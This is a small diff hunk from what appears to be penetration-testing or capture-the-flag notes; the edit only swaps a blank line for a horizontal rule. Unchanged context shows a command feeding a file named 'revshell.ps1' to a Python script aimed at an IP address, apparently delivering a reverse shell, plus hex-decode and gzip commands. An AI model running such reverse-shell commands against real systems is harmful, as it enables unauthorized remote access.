@@ -49,7 +49,7 @@ cat .download.dat | xxd -r -p #like strings
 ```python
 python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
 ```
-
+---
 #### Decompress a gzip file:
 ```sh
 gzip -d file.gz
